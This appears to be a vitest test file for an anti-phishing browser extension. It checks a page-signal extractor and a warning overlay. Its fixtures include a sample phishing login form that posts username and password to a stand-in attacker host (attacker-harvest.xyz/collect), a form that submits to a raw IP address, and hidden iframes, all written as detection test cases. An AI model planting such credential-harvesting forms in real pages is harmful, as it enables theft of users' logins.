import { describe, it, expect, beforeEach } from 'vitest';
import { Window } from 'happy-dom';
import { DOMSignalExtractor } from '../src/content/observer';
import { WarningShroudManager } from '../src/content/shroud';

describe('DOMSignalExtractor', () => {
  let window: Window;
  let document: Document;

  beforeEach(() => {
    window = new Window({ url: 'https://bank.example.com/portal' });
    document = window.document as unknown as Document;
  });

  it('reports zero negative signals on standard clean content pages', () => {
    document.body.innerHTML = `
      <header><h1>Welcome to Our Service</h1></header>
      <main><p>Read our documentation here.</p></main>
      <footer><a href="/about">About Us</a></footer>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    expect(signals.has_password_field).toBe(false);
    expect(signals.has_login_form).toBe(false);
    expect(signals.form_action_origin_mismatch).toBe(false);
    expect(signals.form_action_is_ip).toBe(false);
    expect(signals.hidden_iframes_count).toBe(0);
    expect(signals.external_resources_ratio).toBe(0);
  });

  it('correctly recognizes legitimate same-origin login forms', () => {
    document.body.innerHTML = `
      <form action="/auth/login" method="POST">
        <label>Username: <input type="text" name="username" /></label>
        <label>Password: <input type="password" name="password" /></label>
        <button type="submit">Sign In</button>
      </form>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    expect(signals.has_password_field).toBe(true);
    expect(signals.has_login_form).toBe(true);
    expect(signals.form_action_origin_mismatch).toBe(false);
    expect(signals.form_action_is_ip).toBe(false);
  });

  it('flags cross-origin credential submission targets', () => {
    document.body.innerHTML = `
      <form action="http://attacker-harvest.xyz/collect" method="POST">
        <input type="email" name="user" />
        <input type="password" name="pass" />
        <button type="submit">Log In</button>
      </form>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    expect(signals.has_password_field).toBe(true);
    expect(signals.has_login_form).toBe(true);
    expect(signals.form_action_origin_mismatch).toBe(true);
    expect(signals.form_action_target).toBe('http://attacker-harvest.xyz');
    expect(signals.form_action_is_ip).toBe(false);
  });

  it('flags form action targets pointing directly to IP addresses', () => {
    document.body.innerHTML = `
      <form action="http://192.168.1.50/submit" method="POST">
        <input type="password" name="password" />
        <button type="submit">Submit</button>
      </form>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    expect(signals.has_password_field).toBe(true);
    expect(signals.form_action_is_ip).toBe(true);
    expect(signals.form_action_origin_mismatch).toBe(true);
    expect(signals.form_action_target).toBe('http://192.168.1.50');
  });

  it('detects hidden, zero-dimension, and stealth iframes', () => {
    document.body.innerHTML = `
      <iframe src="/normal" width="500" height="300"></iframe>
      <iframe src="/hidden-style" style="display: none"></iframe>
      <iframe src="/hidden-attr" hidden></iframe>
      <iframe src="/zero-dimension" width="0" height="0"></iframe>
      <iframe src="/transparent" style="opacity: 0"></iframe>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    // 4 out of the 5 iframes are hidden/zero-dimension
    expect(signals.hidden_iframes_count).toBe(4);
  });

  it('STRICT PRIVACY GUARANTEE: Never extracts or includes secret values or cookies', () => {
    document.body.innerHTML = `
      <form action="/login" method="POST">
        <input type="text" name="user" value="victim_user_alice" />
        <input type="password" name="password" value="UltraSecretPassword!999" />
      </form>
    `;

    const signals = DOMSignalExtractor.extractSignals(document, {
      origin: 'https://bank.example.com',
      href: 'https://bank.example.com/portal',
    });

    const serialized = JSON.stringify(signals);
    expect(serialized).not.toContain('UltraSecretPassword!999');
    expect(serialized).not.toContain('victim_user_alice');
  });
});

describe('WarningShroudManager', () => {
  let window: Window;
  let document: Document;

  beforeEach(() => {
    window = new Window({ url: 'https://malicious-page.xyz/login' });
    document = window.document as unknown as Document;
  });

  it('injects shadow DOM holding shroud and verifies mounting', () => {
    expect(WarningShroudManager.isDisplayed(document)).toBe(false);

    WarningShroudManager.showWarning(
      'Suspected Credential Harvesting: Form action submits to external destination.',
      ['Form target: http://attacker.xyz', 'Password field present on untrusted domain'],
      document
    );

    expect(WarningShroudManager.isDisplayed(document)).toBe(true);

    const host = document.getElementById('phishguard-warning-shroud-root');
    expect(host).not.toBeNull();
    expect(host?.shadowRoot).toBeDefined();

    const shadow = host?.shadowRoot;
    expect(shadow?.innerHTML).toContain('Suspected Phishing Site');
    expect(shadow?.innerHTML).toContain('http://attacker.xyz');
    expect(shadow?.innerHTML).toContain('Leave This Site');
  });

  it('cleanly dismisses the warning shroud when requested', () => {
    WarningShroudManager.showWarning('Test alert', [], document);
    expect(WarningShroudManager.isDisplayed(document)).toBe(true);

    WarningShroudManager.dismiss(document);
    expect(WarningShroudManager.isDisplayed(document)).toBe(false);
    expect(document.getElementById('phishguard-warning-shroud-root')).toBeNull();
  });
});
